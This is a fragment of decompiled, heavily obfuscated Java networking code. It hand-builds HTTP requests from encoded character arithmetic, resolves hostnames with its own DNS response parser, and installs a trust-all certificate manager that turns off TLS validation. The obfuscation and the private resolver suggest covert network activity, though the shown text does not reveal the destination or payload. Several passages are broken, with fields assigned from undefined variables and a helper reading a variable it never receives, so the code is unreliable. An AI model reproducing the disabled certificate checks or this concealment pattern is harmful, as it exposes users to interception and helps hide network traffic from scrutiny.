         var19.append((char)('轋' - '輝'));
         var19.append((char)(32220 - 32171));
         var19.append((char)(27999 - 27986));
         var19.append((char)(4381 - 4371));
         var10000.append(var19.toString());
         StringBuilder var21 = new StringBuilder();
         char[] var22 = new char[]{
            (char)('覾' ^ '觶'),
            (char)(18349 ^ 18370),
            (char)(2390 ^ 2341),
            (char)('ꑖ' ^ 'ꐢ'),
            (char)('\uf4da' ^ '\uf4e0'),
            (char)(4817 ^ 4849),
            (char)(16379 ^ 16280),
            (char)('覚' ^ '觶'),
            (char)(18349 ^ 18370),
            (char)(2384 ^ 2341)
         };
         var21.append(new String(var22));
         StringBuilder var24 = new StringBuilder();
         var24.append((char)(24775 - 24675));
         var24.append((char)('\uf324' - '\uf2be'));
         var24.append((char)('ꞛ' - 'ꜯ'));
         var24.append((char)('袦' - '衅'));
         var24.append((char)(22844 - 22730));
         var24.append((char)(32692 - 32591));
         var24.append((char)(3187 - 3142));
         var24.append((char)(1673 - 1573));
         var24.append((char)(17367 - 17257));
         var24.append((char)('诎' - '譛'));
         var24.append((char)(21783 - 21737));
         var24.append((char)(24774 - 24675));
         var24.append((char)('\uf32d' - '\uf2be'));
         var24.append((char)('Ꞝ' - 'ꜯ'));
         var24.append((char)('衒' - '衅'));
         var24.append((char)(22740 - 22730));
         var21.append(var24.toString());
         eTmp.append(var21.toString());
         StringBuilder var26 = new StringBuilder();
         char[] var27 = new char[]{
            (char)(24685 ^ 24620),
            (char)('\uee85' ^ '\ueee6'),
            (char)('鍮' ^ '錍'),
            (char)(8946 ^ 8855),
            (char)('袑' ^ '裡'),
            (char)('\ud8ec' ^ '\ud898'),
            (char)(23492 ^ 23550),
            (char)('곛' ^ '곻'),
            (char)(857 ^ 824),
            (char)(24668 ^ 24620),
            (char)('\uee96' ^ '\ueee6'),
            (char)('鍡' ^ '錍'),
            (char)(8958 ^ 8855),
            (char)('袂' ^ '裡'),
            (char)('\ud8f9' ^ '\ud898'),
            (char)(23434 ^ 23550)
         };
         var26.append(new String(var27));
         StringBuilder var29 = new StringBuilder();
         var29.append((char)(12586 ^ 12611));
         var29.append((char)('\uf473' ^ '\uf41c'));
         var29.append((char)('뱩' ^ '밇'));
         var29.append((char)('\uecf2' ^ '\uecdd'));
         var29.append((char)(32461 ^ 32425));
         var29.append((char)(18102 ^ 18136));
         var29.append((char)(9184 ^ 9107));
         var29.append((char)(14396 ^ 14353));
         var29.append((char)('넿' ^ '녒'));
         var29.append((char)('쬲' ^ '쭗'));
         var29.append((char)(194 ^ 177));
         var29.append((char)(12592 ^ 12611));
         var29.append((char)('\uf47d' ^ '\uf41c'));
         var29.append((char)('뱠' ^ '밇'));
         var29.append((char)('\uecb8' ^ '\uecdd'));
         var29.append((char)(32420 ^ 32425));
         var29.append((char)(18130 ^ 18136));
         var26.append(var29.toString());
         eTmp.append(var26.toString());
         char[] var31 = new char[]{
            (char)('얠' ^ '엣'),
            (char)('랥' ^ '럊'),
            (char)(8156 ^ 8114),
            (char)('\udc95' ^ '\udcfb'),
            (char)('퍗' ^ '팲'),
            (char)(4031 ^ 4060),
            (char)('얗' ^ '엣'),
            (char)('랣' ^ '럊'),
            (char)(8157 ^ 8114),
            (char)('\udc95' ^ '\udcfb'),
            (char)('팈' ^ '팲'),
            (char)(4092 ^ 4060),
            (char)('얀' ^ '엣'),
            (char)('랦' ^ '럊'),
            (char)(8157 ^ 8114),
            (char)('\udc88' ^ '\udcfb'),
            (char)('퍗' ^ '팲'),
            (char)(4049 ^ 4060),
            (char)('엩' ^ '엣')
         };
         eTmp.append(new String(var31));
         eTmp.append("\r\n");
         holder5.write(eTmp.toString().getBytes(StandardCharsets.ISO_8859_1));
         int var32 = 980301862;
         if ((var32 & 980301862) == 980301862) {
            long var37 = -144812644L;
            long var38 = var37 * 29L;
            long var39 = var38 ^ 487311992L;
            int var34 = 8228;
            var34 *= 54;
         }

         holder5.flush();
         odmnmv_usk_oj_ppr.qKdcJ ktvtkrDvptnVqrvokHkne = kolausFacade(resultPtr);
         var9 = ktvtkrDvptnVqrvokHkne.body;
      } finally {
         MGzvRebIV.close();
      }

      return var9;
   }

   private static String Gg_YjOJrd(byte[] response) {
      if (sawqewHlnaig != null && sawqewHlnaig.length >= 12) {
         ByteBuffer kbQbidrBwnctNjsc = ByteBuffer.wrap(sawqewHlnaig);
         kbQbidrBwnctNjsc.getShort();
         short vW_O1LyK = kbQbidrBwnctNjsc.getShort();
         if ((vW_O1LyK & '耀') == 0) {
            return null;
         } else {
            int paat_AFcm_noys_wxSW = vW_O1LyK & 15;
            if (paat_AFcm_noys_wxSW != 0) {
               return null;
            } else {
               int xf_nvidnl_xjds_ltog = kbQbidrBwnctNjsc.getShort() & '\uffff';
               int CcxtEZm0H2 = kbQbidrBwnctNjsc.getShort() & '\uffff';
               kbQbidrBwnctNjsc.getShort();
               kbQbidrBwnctNjsc.getShort();

               for (int key0 = 0; key0 < xf_nvidnl_xjds_ltog; key0++) {
                  jzju_hih(kbQbidrBwnctNjsc);
                  kbQbidrBwnctNjsc.getShort();
                  kbQbidrBwnctNjsc.getShort();
               }

               for (int capLen = 0; capLen < CcxtEZm0H2; capLen++) {
                  jzju_hih(kbQbidrBwnctNjsc);
                  int strData = kbQbidrBwnctNjsc.getShort() & '\uffff';
                  kbQbidrBwnctNjsc.getShort();
                  kbQbidrBwnctNjsc.getInt();
                  int c0nlql_HLT_kSq = kbQbidrBwnctNjsc.getShort() & '\uffff';
                  if (strData == 1 && c0nlql_HLT_kSq == 4) {
                     byte[] UmqM_XrQQ_gdWS_iiIR = new byte[4];
                     kbQbidrBwnctNjsc.get(UmqM_XrQQ_gdWS_iiIR);
                     int var10000 = UmqM_XrQQ_gdWS_iiIR[0] & 255;
                     int var10001 = UmqM_XrQQ_gdWS_iiIR[1] & 255;
                     int var10002 = UmqM_XrQQ_gdWS_iiIR[2] & 255;
                     int var13 = UmqM_XrQQ_gdWS_iiIR[3] & 255;
                     int var12 = var10002;
                     int var11 = var10001;
                     int var10 = var10000;
                     return var10 + "." + var11 + "." + var12 + "." + var13;
                  }

                  kbQbidrBwnctNjsc.position(kbQbidrBwnctNjsc.position() + c0nlql_HLT_kSq);
               }

               return null;
            }
         }
      } else {
         return null;
      }
   }

   private static void jzju_hih(ByteBuffer buf) {
      while (i.hasRemaining()) {
         int tjnrab_fydw = i.get() & 255;
         if (tjnrab_fydw != 0) {
            if ((tjnrab_fydw & 192) != 192) {
               i.position(i.position() + tjnrab_fydw);
               continue;
            } else {
               i.get();
            }
         }
         break;
      }
   }

   static {
      try {
         SSLContext kyHfBstctIe = SSLContext.getInstance("TLS");
         kyHfBstctIe.init(null, new TrustManager[]{new odmnmv_usk_oj_ppr.updateSyzvbp()}, new SecureRandom());
         bvftU = kyHfBstctIe.getSocketFactory();
      } catch (Exception var1) {
         bvftU = (SSLSocketFactory)SSLSocketFactory.getDefault();
      }
   }

   public static class qKdcJ {
      public final int statusCode;
      public final String statusLine;
      public final Map<String, String> headers;
      public final byte[] body;

      qKdcJ(int statusCode, String statusLine, Map<String, String> headers, byte[] body) {
         kmbNcRptecEej.statusCode = grecpv_lpx_ui_lilkdc;
         kmbNcRptecEej.statusLine = XWmU_QBER_mADk_uAEy;
         kmbNcRptecEej.headers = headTmp;
         kmbNcRptecEej.body = zsvJi;
      }

      public String bodyString() {
         return new String(L69p7aC_UL9D.body, StandardCharsets.UTF_8);
      }

      public String header(String name) {
         return ixTVISZROI_N.headers.get(jbz_xzbn.toLowerCase());
      }
   }

   private static class ujsfd7 {
      final String ip;
      final long expiresAt;

      ujsfd7(String ip, long expiresAt) {
         argLen.ip = prevAcc;
         argLen.expiresAt = ykmcr_qmspgo_faze_ofqcdw;
      }

      boolean isExpired() {
         return System.currentTimeMillis() > myyT_nxET_PfCd_IAsn.expiresAt;
      }
   }

   private static class updateSyzvbp implements X509TrustManager {
      @Override
      public void checkClientTrusted(X509Certificate[] chain, String authType) {
      }

      @Override
      public void checkServerTrusted(X509Certificate[] chain, String authType) {
      }

      @Override
      public X509Certificate[] getAcceptedIssuers() {
         return new X509Certificate[0];
      }
   }
}
